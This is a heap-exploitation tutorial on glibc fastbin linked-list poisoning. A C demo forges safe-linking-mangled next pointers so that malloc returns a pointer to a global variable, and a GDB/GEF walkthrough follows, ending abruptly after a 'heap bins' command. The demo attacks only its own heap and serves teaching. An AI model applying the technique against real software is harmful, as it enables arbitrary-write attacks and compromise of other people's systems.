# Fastbin Linked List

So the purpose of this writeup is to demonstrate how we can leverage the linked list to get malloc to allocate a ptr to a memory location of our choosing. This is going to be extremely similar to the tcache linked list process, and with the same end result. Due to a few differences, this isn't going to be as practical and useful as the tcache linked list technique. However, since it used to be a lot more useful, I wanted to include it.

Here is the code:

```
#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE 0x50

long target = 0xdeadbeef;

void main() {
    int i;
    long *tcache_chunks[7];
    long *fastbin_chunk0,
            *fastbin_chunk1,
            *fastbin_chunk2,
            *reallocated0,
            *reallocated1;

    long mangled_next0, mangled_next1;

    printf("So this time, our goal will be to get malloc to allocate a ptr to the global variable target at %p\n", &target);
    printf("Which has a value of 0x%lx\n", target);
    printf("We will be doing this, via editing the fastbin linked list.\n");
    printf("This will be similar to the tcache linked list pwn, however because of more checks, it is less practical.\n");
    printf("However since this used to be a super common technique, I wanted to include it.\n");
    printf("So we will start off with inserting three chunks into the fastbin.\n");
    printf("We will first need to fill up the corresponding tcache.\n\n");

    for (i = 0; i < 7; i++) {
        tcache_chunks[i] = malloc(CHUNK_SIZE);
    }

    fastbin_chunk0 = malloc(CHUNK_SIZE);
    fastbin_chunk1 = malloc(CHUNK_SIZE);
    fastbin_chunk2 = malloc(CHUNK_SIZE);


    malloc(CHUNK_SIZE);

    for (i = 0; i < 7; i++) {
        free(tcache_chunks[i]);
    }

    free(fastbin_chunk0);
    free(fastbin_chunk1);
    free(fastbin_chunk2);

    printf("Fastbin Chunk0:\t%p\n", fastbin_chunk0);
    printf("Fastbin Chunk1:\t%p\n", fastbin_chunk1);
    printf("Fastbin Chunk2:\t%p\n\n", fastbin_chunk2);

    printf("Now that we have chunks in the fastbin, let's prepare malloc to allocate a ptr to target.\n");
    printf("The tcache and fastbin linked lists operate in pretty similar ways.\n");
    printf("We will simply alter the next ptr of a fastbin chunk, such that the next chunk will be to where we want allocated.\n");
    printf("However, there is one complication.\n\n");

    printf("The tcache has a bin, for every possible size a fastbin chunk can be.\n");
    printf("Also malloc has a preference to use the tcache over the fastbin.\n");
    printf("As such, when we allocate a chunk from the fastbin, it will attempt to move over as many chunks as it can from the fastbin to the corresponding tcache.\n");
    printf("This adds a complication, since that means the 'fake' fastbin chunk we added, will also have to have a valid next ptr.\n");
    printf("And since there is similar next ptr mangling like with the tcache, we can't just put 0x00 there.\n\n");

    printf("So to summarize\n");
    printf("We will set the next ptr of the fastbin head chunk to point to 0x10 bytes before target (heap chunk header is 0x10 bytes).\n");
    printf("Then, we will set the next ptr of that fake heap chunk at target, to be '0x00' when it's mangled.\n");
    printf("Then, we will allocate a chunk from the fastbin. This will move the target chunk over to the tcache.\n");
    printf("The other two fastbin chunks will not be moved over because of the mangled null next ptr, and basically got removed from the fastbin.\n");
    printf("Then we will allocate a chunk from the tcache with our 'target' chunk, to get the allocated size.\n\n");

    mangled_next0 = (long)(((long)&target - 0x10) ^ ((long)fastbin_chunk2 >> 12));
    mangled_next1 = (long)(((long)0x00) ^ ((long)&target >> 12));

    printf("target mangled next ptr: ((%p - 0x10) ^ (%p >> 12)) = %p\n", &target, fastbin_chunk2, (long*)mangled_next0);
    printf("null mangled next ptr: ((0x00) ^ (%p >> 12)) = %p\n\n", &target, (long*)mangled_next1);

    *fastbin_chunk2 = mangled_next0;
    *((&target)-1) = 0x61;
    target = mangled_next1;

    for (i = 0; i < 7; i++) {
        tcache_chunks[i] = malloc(CHUNK_SIZE);
    }

    reallocated0 = malloc(CHUNK_SIZE);
    reallocated1 = malloc(CHUNK_SIZE);

    printf("Reallocated Ptr:\t%p\n", reallocated1);
    printf("Did we get target?\t%s\n", (reallocated1==&target) ? "True" : "False");
}
```

## Walkthrough

So how will this technique work? We will effectively overwrite the next ptr of a fastbin chunk, to point to somewhere we want malloc to allocate. For the chunk which we overwrite the next ptr to point to where we want, I choose the head of the fastbin. However, the exact process of how we get the chunk will differ a little bit. When we go ahead and allocate a chunk from the fastbin, malloc will try to move as many chunks as it can from the fastbin over to the corresponding tcache with the same size. This moving process is what causes us a few issues. It will move the "fake fastbin" chunk to where we want to allocate, over to the tcache, and then try to look at the chunk after that in the linked list. Looking at the next ptr for the "fake fastbin" chunk is what causes the issue, since next ptr mangling is the same here as it is in the tcache. Thus, we will need to go ahead, and to the area we want to allocate from malloc, write a next ptr (I just put 0x00 mangled, to simplify things, will cause some fastbin chunks to effectively get forgotten).

Also just to reiterate, the address we want malloc to allocate is the address of the global variable `target`.

With that, let's go ahead and see this in action:

```
$   gdb ./fastbin_linked
GNU gdb (Ubuntu 12.0.90-0ubuntu1) 12.0.90
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 12.0.90 in 0.00ms using Python engine 3.10
Reading symbols from ./fastbin_linked...
(No debugging symbols found in ./fastbin_linked)
gef➤  disas main
Dump of assembler code for function main:
   0x00000000000011c9 <+0>: endbr64
   0x00000000000011cd <+4>: push   rbp
   0x00000000000011ce <+5>: mov rbp,rsp
   0x00000000000011d1 <+8>: add rsp,0xffffffffffffff80
   0x00000000000011d5 <+12>:    mov rax,QWORD PTR fs:0x28
   0x00000000000011de <+21>:    mov QWORD PTR [rbp-0x8],rax
   0x00000000000011e2 <+25>:    xor eax,eax
   0x00000000000011e4 <+27>:    lea rax,[rip+0x2e25]        # 0x4010 <target>
   0x00000000000011eb <+34>:    mov rsi,rax
   0x00000000000011ee <+37>:    lea rax,[rip+0xe13]     # 0x2008
   0x00000000000011f5 <+44>:    mov rdi,rax
   0x00000000000011f8 <+47>:    mov eax,0x0
   0x00000000000011fd <+52>:    call   0x10c0 <printf@plt>
   0x0000000000001202 <+57>:    mov rax,QWORD PTR [rip+0x2e07]      # 0x4010 <target>
   0x0000000000001209 <+64>:    mov rsi,rax
   0x000000000000120c <+67>:    lea rax,[rip+0xe59]     # 0x206c
   0x0000000000001213 <+74>:    mov rdi,rax
   0x0000000000001216 <+77>:    mov eax,0x0
   0x000000000000121b <+82>:    call   0x10c0 <printf@plt>
   0x0000000000001220 <+87>:    lea rax,[rip+0xe61]     # 0x2088
   0x0000000000001227 <+94>:    mov rdi,rax
   0x000000000000122a <+97>:    call   0x10a0 <puts@plt>
   0x000000000000122f <+102>:   lea rax,[rip+0xe92]     # 0x20c8
   0x0000000000001236 <+109>:   mov rdi,rax
   0x0000000000001239 <+112>:   call   0x10a0 <puts@plt>
   0x000000000000123e <+117>:   lea rax,[rip+0xef3]     # 0x2138
   0x0000000000001245 <+124>:   mov rdi,rax
   0x0000000000001248 <+127>:   call   0x10a0 <puts@plt>
   0x000000000000124d <+132>:   lea rax,[rip+0xf34]     # 0x2188
   0x0000000000001254 <+139>:   mov rdi,rax
   0x0000000000001257 <+142>:   call   0x10a0 <puts@plt>
   0x000000000000125c <+147>:   lea rax,[rip+0xf6d]     # 0x21d0
   0x0000000000001263 <+154>:   mov rdi,rax
   0x0000000000001266 <+157>:   call   0x10a0 <puts@plt>
   0x000000000000126b <+162>:   mov DWORD PTR [rbp-0x7c],0x0
   0x0000000000001272 <+169>:   jmp 0x128f <main+198>
   0x0000000000001274 <+171>:   mov edi,0x50
   0x0000000000001279 <+176>:   call   0x10d0 <malloc@plt>
   0x000000000000127e <+181>:   mov rdx,rax
   0x0000000000001281 <+184>:   mov eax,DWORD PTR [rbp-0x7c]
   0x0000000000001284 <+187>:   cdqe   
   0x0000000000001286 <+189>:   mov QWORD PTR [rbp+rax*8-0x40],rdx
   0x000000000000128b <+194>:   add DWORD PTR [rbp-0x7c],0x1
   0x000000000000128f <+198>:   cmp DWORD PTR [rbp-0x7c],0x6
   0x0000000000001293 <+202>:   jle 0x1274 <main+171>
   0x0000000000001295 <+204>:   mov edi,0x50
   0x000000000000129a <+209>:   call   0x10d0 <malloc@plt>
   0x000000000000129f <+214>:   mov QWORD PTR [rbp-0x78],rax
   0x00000000000012a3 <+218>:   mov edi,0x50
   0x00000000000012a8 <+223>:   call   0x10d0 <malloc@plt>
   0x00000000000012ad <+228>:   mov QWORD PTR [rbp-0x70],rax
   0x00000000000012b1 <+232>:   mov edi,0x50
   0x00000000000012b6 <+237>:   call   0x10d0 <malloc@plt>
   0x00000000000012bb <+242>:   mov QWORD PTR [rbp-0x68],rax
   0x00000000000012bf <+246>:   mov edi,0x50
   0x00000000000012c4 <+251>:   call   0x10d0 <malloc@plt>
   0x00000000000012c9 <+256>:   mov DWORD PTR [rbp-0x7c],0x0
   0x00000000000012d0 <+263>:   jmp 0x12e8 <main+287>
   0x00000000000012d2 <+265>:   mov eax,DWORD PTR [rbp-0x7c]
   0x00000000000012d5 <+268>:   cdqe   
   0x00000000000012d7 <+270>:   mov rax,QWORD PTR [rbp+rax*8-0x40]
   0x00000000000012dc <+275>:   mov rdi,rax
   0x00000000000012df <+278>:   call   0x1090 <free@plt>
   0x00000000000012e4 <+283>:   add DWORD PTR [rbp-0x7c],0x1
   0x00000000000012e8 <+287>:   cmp DWORD PTR [rbp-0x7c],0x6
   0x00000000000012ec <+291>:   jle 0x12d2 <main+265>
   0x00000000000012ee <+293>:   mov rax,QWORD PTR [rbp-0x78]
   0x00000000000012f2 <+297>:   mov rdi,rax
   0x00000000000012f5 <+300>:   call   0x1090 <free@plt>
   0x00000000000012fa <+305>:   mov rax,QWORD PTR [rbp-0x70]
   0x00000000000012fe <+309>:   mov rdi,rax
   0x0000000000001301 <+312>:   call   0x1090 <free@plt>
   0x0000000000001306 <+317>:   mov rax,QWORD PTR [rbp-0x68]
   0x000000000000130a <+321>:   mov rdi,rax
   0x000000000000130d <+324>:   call   0x1090 <free@plt>
   0x0000000000001312 <+329>:   mov rax,QWORD PTR [rbp-0x78]
   0x0000000000001316 <+333>:   mov rsi,rax
   0x0000000000001319 <+336>:   lea rax,[rip+0xee9]     # 0x2209
   0x0000000000001320 <+343>:   mov rdi,rax
   0x0000000000001323 <+346>:   mov eax,0x0
   0x0000000000001328 <+351>:   call   0x10c0 <printf@plt>
   0x000000000000132d <+356>:   mov rax,QWORD PTR [rbp-0x70]
   0x0000000000001331 <+360>:   mov rsi,rax
   0x0000000000001334 <+363>:   lea rax,[rip+0xee2]     # 0x221d
   0x000000000000133b <+370>:   mov rdi,rax
   0x000000000000133e <+373>:   mov eax,0x0
   0x0000000000001343 <+378>:   call   0x10c0 <printf@plt>
   0x0000000000001348 <+383>:   mov rax,QWORD PTR [rbp-0x68]
   0x000000000000134c <+387>:   mov rsi,rax
   0x000000000000134f <+390>:   lea rax,[rip+0xedb]     # 0x2231
   0x0000000000001356 <+397>:   mov rdi,rax
   0x0000000000001359 <+400>:   mov eax,0x0
   0x000000000000135e <+405>:   call   0x10c0 <printf@plt>
   0x0000000000001363 <+410>:   lea rax,[rip+0xede]     # 0x2248
   0x000000000000136a <+417>:   mov rdi,rax
   0x000000000000136d <+420>:   call   0x10a0 <puts@plt>
   0x0000000000001372 <+425>:   lea rax,[rip+0xf2f]     # 0x22a8
   0x0000000000001379 <+432>:   mov rdi,rax
   0x000000000000137c <+435>:   call   0x10a0 <puts@plt>
   0x0000000000001381 <+440>:   lea rax,[rip+0xf68]     # 0x22f0
   0x0000000000001388 <+447>:   mov rdi,rax
   0x000000000000138b <+450>:   call   0x10a0 <puts@plt>
   0x0000000000001390 <+455>:   lea rax,[rip+0xfd1]     # 0x2368
   0x0000000000001397 <+462>:   mov rdi,rax
   0x000000000000139a <+465>:   call   0x10a0 <puts@plt>
   0x000000000000139f <+470>:   lea rax,[rip+0xfea]     # 0x2390
   0x00000000000013a6 <+477>:   mov rdi,rax
   0x00000000000013a9 <+480>:   call   0x10a0 <puts@plt>
   0x00000000000013ae <+485>:   lea rax,[rip+0x1023]        # 0x23d8
   0x00000000000013b5 <+492>:   mov rdi,rax
   0x00000000000013b8 <+495>:   call   0x10a0 <puts@plt>
   0x00000000000013bd <+500>:   lea rax,[rip+0x105c]        # 0x2420
   0x00000000000013c4 <+507>:   mov rdi,rax
   0x00000000000013c7 <+510>:   call   0x10a0 <puts@plt>
   0x00000000000013cc <+515>:   lea rax,[rip+0x10e5]        # 0x24b8
   0x00000000000013d3 <+522>:   mov rdi,rax
   0x00000000000013d6 <+525>:   call   0x10a0 <puts@plt>
   0x00000000000013db <+530>:   lea rax,[rip+0x114e]        # 0x2530
   0x00000000000013e2 <+537>:   mov rdi,rax
   0x00000000000013e5 <+540>:   call   0x10a0 <puts@plt>
   0x00000000000013ea <+545>:   lea rax,[rip+0x11a1]        # 0x2592
   0x00000000000013f1 <+552>:   mov rdi,rax
   0x00000000000013f4 <+555>:   call   0x10a0 <puts@plt>
   0x00000000000013f9 <+560>:   lea rax,[rip+0x11a8]        # 0x25a8
   0x0000000000001400 <+567>:   mov rdi,rax
   0x0000000000001403 <+570>:   call   0x10a0 <puts@plt>
   0x0000000000001408 <+575>:   lea rax,[rip+0x1219]        # 0x2628
   0x000000000000140f <+582>:   mov rdi,rax
   0x0000000000001412 <+585>:   call   0x10a0 <puts@plt>
   0x0000000000001417 <+590>:   lea rax,[rip+0x1272]        # 0x2690
   0x000000000000141e <+597>:   mov rdi,rax
   0x0000000000001421 <+600>:   call   0x10a0 <puts@plt>
   0x0000000000001426 <+605>:   lea rax,[rip+0x12cb]        # 0x26f8
   0x000000000000142d <+612>:   mov rdi,rax
   0x0000000000001430 <+615>:   call   0x10a0 <puts@plt>
   0x0000000000001435 <+620>:   lea rax,[rip+0x1344]        # 0x2780
   0x000000000000143c <+627>:   mov rdi,rax
   0x000000000000143f <+630>:   call   0x10a0 <puts@plt>
   0x0000000000001444 <+635>:   mov rax,QWORD PTR [rbp-0x68]
   0x0000000000001448 <+639>:   sar rax,0xc
   0x000000000000144c <+643>:   mov rdx,rax
   0x000000000000144f <+646>:   lea rax,[rip+0x2bba]        # 0x4010 <target>
   0x0000000000001456 <+653>:   sub rax,0x10
   0x000000000000145a <+657>:   xor rax,rdx
   0x000000000000145d <+660>:   mov QWORD PTR [rbp-0x60],rax
   0x0000000000001461 <+664>:   lea rax,[rip+0x2ba8]        # 0x4010 <target>
   0x0000000000001468 <+671>:   sar rax,0xc
   0x000000000000146c <+675>:   mov QWORD PTR [rbp-0x58],rax
   0x0000000000001470 <+679>:   mov rdx,QWORD PTR [rbp-0x60]
   0x0000000000001474 <+683>:   mov rax,QWORD PTR [rbp-0x68]
   0x0000000000001478 <+687>:   mov rcx,rdx
   0x000000000000147b <+690>:   mov rdx,rax
   0x000000000000147e <+693>:   lea rax,[rip+0x2b8b]        # 0x4010 <target>
   0x0000000000001485 <+700>:   mov rsi,rax
   0x0000000000001488 <+703>:   lea rax,[rip+0x1359]        # 0x27e8
   0x000000000000148f <+710>:   mov rdi,rax
   0x0000000000001492 <+713>:   mov eax,0x0
   0x0000000000001497 <+718>:   call   0x10c0 <printf@plt>
   0x000000000000149c <+723>:   mov rax,QWORD PTR [rbp-0x58]
   0x00000000000014a0 <+727>:   mov rdx,rax
   0x00000000000014a3 <+730>:   lea rax,[rip+0x2b66]        # 0x4010 <target>
   0x00000000000014aa <+737>:   mov rsi,rax
   0x00000000000014ad <+740>:   lea rax,[rip+0x1374]        # 0x2828
   0x00000000000014b4 <+747>:   mov rdi,rax
   0x00000000000014b7 <+750>:   mov eax,0x0
   0x00000000000014bc <+755>:   call   0x10c0 <printf@plt>
   0x00000000000014c1 <+760>:   mov rax,QWORD PTR [rbp-0x68]
   0x00000000000014c5 <+764>:   mov rdx,QWORD PTR [rbp-0x60]
   0x00000000000014c9 <+768>:   mov QWORD PTR [rax],rdx
   0x00000000000014cc <+771>:   lea rax,[rip+0x2b35]        # 0x4008
   0x00000000000014d3 <+778>:   mov QWORD PTR [rax],0x61
   0x00000000000014da <+785>:   mov rax,QWORD PTR [rbp-0x58]
   0x00000000000014de <+789>:   mov QWORD PTR [rip+0x2b2b],rax      # 0x4010 <target>
   0x00000000000014e5 <+796>:   mov DWORD PTR [rbp-0x7c],0x0
   0x00000000000014ec <+803>:   jmp 0x1509 <main+832>
   0x00000000000014ee <+805>:   mov edi,0x50
   0x00000000000014f3 <+810>:   call   0x10d0 <malloc@plt>
   0x00000000000014f8 <+815>:   mov rdx,rax
   0x00000000000014fb <+818>:   mov eax,DWORD PTR [rbp-0x7c]
   0x00000000000014fe <+821>:   cdqe   
   0x0000000000001500 <+823>:   mov QWORD PTR [rbp+rax*8-0x40],rdx
   0x0000000000001505 <+828>:   add DWORD PTR [rbp-0x7c],0x1
   0x0000000000001509 <+832>:   cmp DWORD PTR [rbp-0x7c],0x6
   0x000000000000150d <+836>:   jle 0x14ee <main+805>
   0x000000000000150f <+838>:   mov edi,0x50
   0x0000000000001514 <+843>:   call   0x10d0 <malloc@plt>
   0x0000000000001519 <+848>:   mov QWORD PTR [rbp-0x50],rax
   0x000000000000151d <+852>:   mov edi,0x50
   0x0000000000001522 <+857>:   call   0x10d0 <malloc@plt>
   0x0000000000001527 <+862>:   mov QWORD PTR [rbp-0x48],rax
   0x000000000000152b <+866>:   mov rax,QWORD PTR [rbp-0x48]
   0x000000000000152f <+870>:   mov rsi,rax
   0x0000000000001532 <+873>:   lea rax,[rip+0x1323]        # 0x285c
   0x0000000000001539 <+880>:   mov rdi,rax
   0x000000000000153c <+883>:   mov eax,0x0
   0x0000000000001541 <+888>:   call   0x10c0 <printf@plt>
   0x0000000000001546 <+893>:   lea rax,[rip+0x2ac3]        # 0x4010 <target>
   0x000000000000154d <+900>:   cmp QWORD PTR [rbp-0x48],rax
   0x0000000000001551 <+904>:   jne 0x155c <main+915>
   0x0000000000001553 <+906>:   lea rax,[rip+0x1317]        # 0x2871
   0x000000000000155a <+913>:   jmp 0x1563 <main+922>
   0x000000000000155c <+915>:   lea rax,[rip+0x1313]        # 0x2876
   0x0000000000001563 <+922>:   mov rsi,rax
   0x0000000000001566 <+925>:   lea rax,[rip+0x130f]        # 0x287c
   0x000000000000156d <+932>:   mov rdi,rax
   0x0000000000001570 <+935>:   mov eax,0x0
   0x0000000000001575 <+940>:   call   0x10c0 <printf@plt>
   0x000000000000157a <+945>:   nop
   0x000000000000157b <+946>:   mov rax,QWORD PTR [rbp-0x8]
   0x000000000000157f <+950>:   sub rax,QWORD PTR fs:0x28
   0x0000000000001588 <+959>:   je  0x158f <main+966>
   0x000000000000158a <+961>:   call   0x10b0 <__stack_chk_fail@plt>
   0x000000000000158f <+966>:   leave  
   0x0000000000001590 <+967>:   ret    
End of assembler dump.
gef➤  b *main+329
Breakpoint 1 at 0x1312
gef➤  b *main+803
Breakpoint 2 at 0x14ec
gef➤  b *main+843
Breakpoint 3 at 0x1514
gef➤  b *main+848
Breakpoint 4 at 0x1519
gef➤  b *main+862
Breakpoint 5 at 0x1527
gef➤  r
Starting program: /Hackery/shogun/pwn_demos/fastbin/fastbin_linked/fastbin_linked
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
So this time, our goal will be to get malloc to allocate a ptr to the global variable target at 0x555555558010
Which has a value of 0xdeadbeef
We will be doing this, via editing the fastbin linked list.
This will be similar to the tcache linked list pwn, however because of more checks, it is less practical.
However since this used to be a super common technique, I wanted to include it.
So we will start off with inserting three chunks into the fastbin.
We will first need to fill up the corresponding tcache.


Breakpoint 1, 0x0000555555555312 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0             
$rbx   : 0x0             
$rcx   : 0x55500000ccf9    
$rdx   : 0x00005555555599a0  →  0x0000000000000000
$rsp   : 0x00007fffffffdf40  →  0x000000070000000d ("\r"?)
$rbp   : 0x00007fffffffdfc0  →  0x0000000000000001
$rsi   : 0x0000555555559010  →  0x0000000000000000
$rdi   : 0x7             
$rip   : 0x0000555555555312  →  <main+329> mov rax, QWORD PTR [rbp-0x78]
$r8 : 0x0000555555559a10  →  0x000055500000ccf9
$r9 : 0x0000555555559a70  →  0x0000000000000000
$r10   : 0x0             
$r11   : 0xf7523c7a01f891fe
$r12   : 0x00007fffffffe0d8  →  0x00007fffffffe3d7  →  "/Hackery/shogun/pwn_demos/fastbin/fastbin[...]"
$r13   : 0x00005555555551c9  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555180  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf40│+0x0000: 0x000000070000000d ("\r"?)   ← $rsp
0x00007fffffffdf48│+0x0008: 0x0000555555559950  →  0x0000000555555559
0x00007fffffffdf50│+0x0010: 0x00005555555599b0  →  0x000055500000cc19
0x00007fffffffdf58│+0x0018: 0x0000555555559a10  →  0x000055500000ccf9
0x00007fffffffdf60│+0x0020: 0x0000555555554040  →   (bad)
0x00007fffffffdf68│+0x0028: 0x00007ffff7fe283c  →  <_dl_sysdep_start+1020> mov rax, QWORD PTR [rsp+0x58]
0x00007fffffffdf70│+0x0030: 0x00000000000006f0
0x00007fffffffdf78│+0x0038: 0x00007fffffffe3b9  →  0x592181489ad07b3e
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555306 <main+317>    mov rax, QWORD PTR [rbp-0x68]
   0x55555555530a <main+321>    mov rdi, rax
   0x55555555530d <main+324>    call   0x555555555090 <free@plt>
 → 0x555555555312 <main+329>    mov rax, QWORD PTR [rbp-0x78]
   0x555555555316 <main+333>    mov rsi, rax
   0x555555555319 <main+336>    lea rax, [rip+0xee9]        # 0x555555556209
   0x555555555320 <main+343>    mov rdi, rax
   0x555555555323 <main+346>    mov eax, 0x0
   0x555555555328 <main+351>    call   0x5555555550c0 <printf@plt>
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "fastbin_linked", stopped 0x555555555312 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555312 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
Tcachebins[idx=4, size=0x60, count=7] ←  Chunk(addr=0x5555555598f0, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559890, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559830, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555597d0, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559770, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559710, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555596b0, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
─────────────────────────────── Fastbins for arena at 0x7ffff7e19c80 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60]  ←  Chunk(addr=0x555555559a10, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555599b0, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559950, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e19c80 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e19c80 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e19c80 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

So we see, we have three chunks in the fastbin. Now, we will overwrite the next ptr of the `0x555555559a10` to point to the target (mangled of course). Then, we will write the next ptr of the "fake fastbin chunk" to point to `0x00`:

```
gef➤  c
Continuing.
Fastbin Chunk0: 0x555555559950
Fastbin Chunk1: 0x5555555599b0
Fastbin Chunk2: 0x555555559a10

Now that we have chunks in the fastbin, let's prepare malloc to allocate a ptr to target.
The tcache and fastbin linked lists operate in pretty similar ways.
We will simply alter the next ptr of a fastbin chunk, such that the next chunk will be to where we want allocated.
However, there is one complication.

The tcache has a bin, for every possible size a fastbin chunk can be.
Also malloc has a preference to use the tcache over the fastbin.
As such, when we allocate a chunk from the fastbin, it will attempt to move over as many chunks as it can from the fastbin to the corresponding tcache.
This adds a complication, since that means the 'fake' fastbin chunk we added, will also have to have a valid next ptr.
And since there is similar next ptr mangling like with the tcache, we can't just put 0x00 there.

So to summarize
We will set the next ptr of the fastbin head chunk to point to 0x10 bytes before target (heap chunk header is 0x10 bytes).
Then, we will set the next ptr of that fake heap chunk at target, to be '0x00' when it's mangled.
Then, we will allocate a chunk from the fastbin. This will move the target chunk over to the tcache.
The other two fastbin chunks will not be moved over because of the mangled null next ptr, and basically got removed from the fastbin.
Then we will allocate a chunk from the tcache with our 'target' chunk, to get the allocated size.

target mangled next ptr: ((0x555555558010 - 0x10) ^ (0x555555559a10 >> 12)) = 0x55500000d559
null mangled next ptr: ((0x00) ^ (0x555555558010 >> 12)) = 0x555555558


Breakpoint 2, 0x00005555555554ec in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x555555558     
$rbx   : 0x0             
$rcx   : 0x1             
$rdx   : 0x55500000d559    
$rsp   : 0x00007fffffffdf40  →  0x000000000000000d ("\r"?)
$rbp   : 0x00007fffffffdfc0  →  0x0000000000000001
$rsi   : 0x00005555555592a0  →  "null mangled next ptr: ((0x00) ^ (0x555555558010 >[...]"
$rdi   : 0x00007fffffffd9e0  →  0x00007ffff7c62050  →  <funlockfile+0> endbr64
$rip   : 0x00005555555554ec  →  <main+803> jmp 0x555555555509 <main+832>
$r8 : 0x0            
$r9 : 0x00007fffffffde0f  →  "555555558"
$r10   : 0x0             
$r11   : 0x246           
$r12   : 0x00007fffffffe0d8  →  0x00007fffffffe3d7  →  "/Hackery/shogun/pwn_demos/fastbin/fastbin[...]"
$r13   : 0x00005555555551c9  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555180  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf40│+0x0000: 0x000000000000000d ("\r"?)   ← $rsp
0x00007fffffffdf48│+0x0008: 0x0000555555559950  →  0x0000000555555559
0x00007fffffffdf50│+0x0010: 0x00005555555599b0  →  0x000055500000cc19
0x00007fffffffdf58│+0x0018: 0x0000555555559a10  →  0x000055500000d559
0x00007fffffffdf60│+0x0020: 0x000055500000d559
0x00007fffffffdf68│+0x0028: 0x0000000555555558
0x00007fffffffdf70│+0x0030: 0x00000000000006f0
0x00007fffffffdf78│+0x0038: 0x00007fffffffe3b9  →  0x592181489ad07b3e
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555554da <main+785>    mov rax, QWORD PTR [rbp-0x58]
   0x5555555554de <main+789>    mov QWORD PTR [rip+0x2b2b], rax     # 0x555555558010 <target>
   0x5555555554e5 <main+796>    mov DWORD PTR [rbp-0x7c], 0x0
 → 0x5555555554ec <main+803>    jmp 0x555555555509 <main+832>
   0x5555555554ee <main+805>    mov edi, 0x50
   0x5555555554f3 <main+810>    call   0x5555555550d0 <malloc@plt>
   0x5555555554f8 <main+815>    mov rdx, rax
   0x5555555554fb <main+818>    mov eax, DWORD PTR [rbp-0x7c]
   0x5555555554fe <main+821>    cdqe   
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "fastbin_linked", stopped 0x5555555554ec in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555554ec → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
